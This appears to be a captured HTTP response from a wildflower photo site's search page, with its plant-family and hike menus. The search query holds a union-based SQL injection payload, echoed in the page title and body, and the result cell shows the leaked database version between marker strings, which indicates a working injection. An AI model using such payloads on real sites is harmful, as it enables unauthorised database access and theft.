@@ -1,0 +1,229 @@
+HTTP/1.1 200 OK
+Date: Thu, 26 Dec 2019 12:34:07 GMT
+Server: Apache
+Upgrade: h2,h2c
+Connection: Upgrade, close
+Vary: Accept-Encoding,User-Agent
+Content-Type: text/html; charset=ISO-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<html>
+<head>
+<title>Colorado wildflowers search results Search: blue' AND 1=2 uNiON all SEleCT 1,2,(select CONCAT(CHAR(100,100,100),CHAR(91,88,93),vErsion(),CHAR(91,88,88,93))   limit 0,1 ),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30  #</title>
+<link href="main.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<table bgcolor="#728959" cellspacing="0" cellpadding="0">
+<tr>
+<td class="lb">&nbsp;</td>
+<td class="mcell" align="center"><a href="index.html"><img src="./images/logo.png" border="0" style="padding-top:5px;padding-bottom:10px;margin-top:5px;" alt="Colorado wildflowers" title="Colorado wildflowers"></a></td>
+<td class="rb">&nbsp;</td>
+</tr>
+<tr>
+<td class="lb">&nbsp;
+</td>
+<td class="mcell">
+<p><a href="index.html">Home</a>&nbsp;&nbsp;&nbsp;<a href="#search">Search again</a></p>
+Search: blue' AND 1=2 uNiON all SEleCT 1,2,(select CONCAT(CHAR(100,100,100),CHAR(91,88,93),vErsion(),CHAR(91,88,88,93))   limit 0,1 ),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30  #<br>
+<p>Here are the flowers that I have found!</p>
+<hr  noshade="noshade">
+<table>
+<tr><td class="pcell"><a href="/large/ddd[X]5.6.44-cll-lve[XX]" target="_blank"><img src="./flowers/ddd[X]5.6.44-cll-lve[XX]" border="1" alt="23" title="24 - 23"></a></td>
+<td class="pcell"><ul class="info"><li><b>Image id:</b> 1-22</li><li><b>Latin name:</b><i> 23</i></li><li><b>Common name:</b> 24</li><li><b>Hike:</b> <a href="hike.cgi?hike_id=14">15</a>, 16</li><li><b>Date:</b>18, 19</li><li><b>Family:</b><a href="search.cgi?family_id=28">29</a> (<i>30</i>)</li><li><b>Identify this flower?</b><a href="&#109;&#97;&#105;&#108;&#116;&#111;:&#109;&#104;&#109;&#64;&#119;&#105;&#108;&#100;&#102;&#108;&#111;&#119;&#101;&#114;&#99;&#104;&#105;&#108;&#100;.&#105;&#110;&#102;&#111;?subject=image id 1">email me</a></li><li>26</li><li><a href='27' target='_blank'>More info</a> (different website)</li></ul></td>
+</tr></table>
+<a name="search"></a>
+<form method="get" action="search.cgi">
+<table border="1">
+<tr><td colspan="2">
+<select name="color">
+<option value="">Select color</option>
+<option value="blue">blue</option>
+<option value="white">white</option>
+<option value="yellow">yellow</option>
+<option value="purple">purple</option>
+<option value="red">red</option>
+<option value="pink">pink</option>
+<option value="brown">brown</option>
+<option value="green">green</option>
+</select>
+<select name="plant">
+<option value="">Select plant type</option>
+<option value="herb">herb</option>
+<option value="shrub">tree/shrub</option>
+<option value="fungi">fungi</option>
+</select>
+<select name="shape">
+<option value="">Select flower shape</option>
+<option value="simple">simple</option>
+<option value="odd">odd</option>
+<option value="rayed">rayed</option>
+<option value="cluster">cluster</option>
+<option value="fungi">fungi</option>
+</select>
+<select name="family_id">
+<option value="">Select family</option><option value='2'>agave (Agvacrae)</option>
+<option value='1'>Amanitaceae (Amanitaceae)</option>
+<option value='79'>amaranth (Amaranthaceae)</option>
+<option value='3'>aster (Asteraceae)</option>
+<option value='4'>barberry (Berberidaceae)</option>
+<option value='67'>beech (Fagacaea)</option>
+<option value='5'>bellflower (Campanulaceae)</option>
+<option value='6'>borage (Boraginaceae)</option>
+<option value='7'>buttercup (Ranunculaceae)</option>
+<option value='8'>cactus (Cactaceae)</option>
+<option value='80'>caltrop (Zygophyllaceae)</option>
+<option value='62'>caper (Capparaceae)</option>
+<option value='65'>cattail (Typhaceae)</option>
+<option value='10'>chickweed (Alsinaceae)</option>
+<option value='11'>coral fungi (Clavariceae)</option>
+<option value='70'>cypress (Cupressaceae)</option>
+<option value='72'>dogbane (Apocynaceae)</option>
+<option value='60'>dogwood (Cornus canadensis)</option>
+<option value='12'>eveningprimrose (Onagraceae)</option>
+<option value='13'>figwort (Scrophulariaceae)</option>
+<option value='14'>flax (Linaceae)</option>
+<option value='75'>fouroclock (Nyctaginaceae)</option>
+<option value='57'>fumitory (Fumariaceae)</option>
+<option value='15'>gentian (Gentianaceae)</option>
+<option value='16'>geranium (Geraniaceae)</option>
+<option value='17'>gooseberry (Grossulariaceae)</option>
+<option value='18'>goosefoot (Chenopodiaceae)</option>
+<option value='71'>gourd (Cucurbitacaea)</option>
+<option value='68'>grape (Vitaceae)</option>
+<option value='19'>grass (Poaceae)</option>
+<option value='20'>grass-of-parnassus (Parnassiaceae)</option>
+<option value='21'>heath (Ericaceae)</option>
+<option value='22'>hellebore (Helleboraceae)</option>
+<option value='23'>honeysuckle (Caprifoliaceae)</option>
+<option value='24'>horsetail (Equisetaceae)</option>
+<option value='25'>hydrangea (Hydrangeaceae)</option>
+<option value='26'>iris (Iridaceae)</option>
+<option value='27'>knotweed/buckwheat (Polygonaceae)</option>
+<option value='28'>lily (Liliaceae)</option>
+<option value='55'>madder (Rubiaceae)</option>
+<option value='29'>mallow (Malvaceae)</option>
+<option value='76'>maple (Aceraceae)</option>
+<option value='30'>mariposa (Calochortaceae)</option>
+<option value='31'>mayflower (Convallariaceae)</option>
+<option value='66'>milkweed (Asclepiadaceae)</option>
+<option value='58'>mint (Lamiaceae)</option>
+<option value='32'>morning glory (Convolvulaceae)</option>
+<option value='33'>mustard (Brassicaceae)</option>
+<option value='69'>nettle (Urticaceae)</option>
+<option value='78'>oleaster (Elaeagnaceae)</option>
+<option value='34'>onion (Alliaceae)</option>
+<option value='73'>orchid (Orchidaceae)</option>
+<option value='9'>parsley (Apiaceae)</option>
+<option value='35'>pea (Fabaceae)</option>
+<option value='36'>phlox (Polemoniaceae)</option>
+<option value='61'>pine (Pinaceae)</option>
+<option value='74'>pinesap (Monotropaceae)</option>
+<option value='37'>pink (Caryophyllaceae)</option>
+<option value='38'>plantain (Plantaginaceae)</option>
+<option value='39'>poppy (Papaveraceae)</option>
+<option value='40'>potato (Solancaeae)</option>
+<option value='41'>primrose (Primulaceae)</option>
+<option value='42'>purslane (Portulacaceae)</option>
+<option value='43'>rock lichen (rock lichen)</option>
+<option value='44'>rose (Rosaceae)</option>
+<option value='45'>sandalwood (Santalaceae)</option>
+<option value='56'>saxifrage (Saxifragaceae)</option>
+<option value='63'>sedge (Cyperaceae)</option>
+<option value='46'>spiderwort (Commelinaceae)</option>
+<option value='47'>spurge (Euphorbiaceae)</option>
+<option value='48'>stonecrop (Crassulaceae)</option>
+<option value='49'>sumac (Anacardiaceae)</option>
+<option value='54'>unknown (unknown)</option>
+<option value='50'>violet (Violaceae)</option>
+<option value='51'>waterleaf (Hydrophyllaceae)</option>
+<option value='52'>waxy cap (Hygrophoracaea)</option>
+<option value='59'>willow (Salicaceae)</option>
+<option value='77'>wintergreen (Pyrolaceae)</option>
+<option value='64'>wood lichen (wood lichen)</option>
+<option value='53'>wood sorrel (Oxalidaceae)</option></select>
+</td></tr>
+<tr><td colspan="2" class="mcell">
+common name: <input type="text" name="common"> latin name: <input type="text" name="latin">
+</td></tr>
+<tr><td class="mcell">
+<select name="hike_id">
+<option value="">Select hike</option><option value='15'>Along Trail Ridge Road, June, 2006</option>
+<option value='28'>Arthur's Rock, June, 2007</option>
+<option value='60'>Arthur's Rock, June, 2011</option>
+<option value='9'>Aspen Creek, August, 2006</option>
+<option value='40'>Aurora Reservoir Circuit, June, 2008</option>
+<option value='30'>Beaver Brook, June, 2007</option>
+<option value='8'>Butler Gulch, August, 2006</option>
+<option value='32'>Butler Gulch, July, 2007</option>
+<option value='45'>Butler Gulch, August, 2009</option>
+<option value='12'>Calypso Cascades, June, 2006</option>
+<option value='56'>Calypso Cascades, June, 2010</option>
+<option value='16'>Castlewood Canyon, September, 2006</option>
+<option value='35'>Cherry Creek Nature Trail, November, 2007</option>
+<option value='52'>Cherry Creek Nature Trail, May, 2009</option>
+<option value='54'>Cherry Creek Nature Trail, July, 2009</option>
+<option value='61'>Cherry Creek Nature Trail, July, 2011</option>
+<option value='39'>Cherry Creek Nature Trail, June 08, June, 2008</option>
+<option value='20'>Dadd Gulch, June, 2005</option>
+<option value='58'>Devil's Head Fire Tower, June, 2010</option>
+<option value='5'>Devils Head Fire Tower, July, 2006</option>
+<option value='37'>East Canyon, April, 2008</option>
+<option value='38'>East Canyon, May, 2008</option>
+<option value='50'>East Canyon, May, 2009</option>
+<option value='59'>Forgotten Valley, July, 2010</option>
+<option value='26'>Fountain Trail, June, 2007</option>
+<option value='41'>Hanging Lake, June, 2008</option>
+<option value='46'>Hell's Hole, August, 2009</option>
+<option value='44'>Herman Gulch, July, 2008</option>
+<option value='42'>Indian Creek Trail, June, 2008</option>
+<option value='34'>Inner Canyon, September, 2007</option>
+<option value='53'>Inner Canyon, June, 2009</option>
+<option value='55'>Inner Canyon, May, 2010</option>
+<option value='21'>Kenosha Pass, July, 2005</option>
+<option value='36'>Kenosha Pass '07, September, 2007</option>
+<option value='51'>Kriley Overlook, July, 2009</option>
+<option value='43'>Kriley Overlook, September, 2008</option>
+<option value='29'>Lair o' the Bear, June, 2007</option>
+<option value='47'>Lions Gulch, July, 2009</option>
+<option value='6'>Masonic Cemetery, July, 2006</option>
+<option value='49'>Mt Galbraith, May, 2009</option>
+<option value='31'>Niwot Trail, Long Lake, July, 2007</option>
+<option value='62'>Ole Barn Knoll, August, 2011</option>
+<option value='7'>Rattlesnake Gulch Trail, July, 2006</option>
+<option value='23'>Rifle Falls, May, 2007</option>
+<option value='22'>Rotary Park, May, 2007</option>
+<option value='3'>South Rim Trail, May, 2006</option>
+<option value='48'>South Rim Trail, May, 2009</option>
+<option value='10'>Streamside Trail, September, 2006</option>
+<option value='57'>Suburban Aurora, August, 2013</option>
+<option value='24'>Three Forks, May, 2007</option>
+<option value='11'>Tundra walk, June, 2006</option>
+<option value='13'>Twin Owls, June, 2006</option>
+<option value='27'>West Pawnee Butte, June, 2007</option>
+<option value='4'>Wetlands Trail, May, 2006</option>
+<option value='25'>Wetlands trail, 07, May, 2007</option>
+<option value='33'>Wetlands Trail, 07b, August, 2007</option></select>
+<select name="SEED">
+<option value="">flowers and seeds</option>
+<option value="1">seeds and pods</option>
+</select>
+</td></tr>
+<tr><td>
+Show:
+<input type="radio" name="show" value="normal">Normal (2 to 3 image per species) 
+<input type="radio" name="show" value="all">All
+<input type="radio" name="show" value="distinct">One each species
+</td></tr>
+<tr><td>
+<input type="submit" value="search">
+</td></tr>
+</table>
+</form>
+<p class="footer">Copyright 2009 Ghostdial Press</p>
+</td>
+<td class="rb">&nbsp;</td>
+</tr>
+</table>
+</body>
+</html>
